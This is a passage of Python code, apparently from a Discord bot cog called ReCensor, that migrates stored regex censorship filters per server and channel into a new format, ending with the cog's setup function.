        newdata[sid] = {
            'priv_exempt' : not sdata.get('no_exemptions', False),
            'filters'     : {}
        }

        for cid, cdata in sdata.items():
            if type(cdata) is not dict:
                continue

            for pattern, mode in cdata.items():
                name = 'migrated_%i' % i
                mode = (mode == 'excl') if mode in {'incl', 'excl'} else False
                enabled = (mode != 'none')
                i += 1

                inline_flags = re.match(r"^\(\?([a-z]+)\)(.*)", pattern, re.IGNORECASE)

                if inline_flags:
                    flags, pattern = inline_flags.groups()
                else:
                    flags = ''

                if pattern.startswith('.*'):
                    pattern = pattern[2:]
                    position = POSITION.ANYWHERE.value
                else:
                    position = POSITION.START.value

                newdata[sid]['filters'][name] = {
                    'pattern'  : pattern,
                    'mode'     : mode,
                    'enabled'  : enabled,
                    'position' : position,
                    'flags'    : ''.join(sorted(set(flags.upper()).intersection(FLAGS_DESC)))
                }

                if cid != 'all':
                    newdata[sid]['filters'][name]['channels_list'] = {
                        'enabled' : True,
                        'mode'    : True,
                        'items'   : [cid]
                    }

    return newdata


def setup(bot):
    check_folder()
    check_file()
    bot.add_cog(ReCensor(bot))
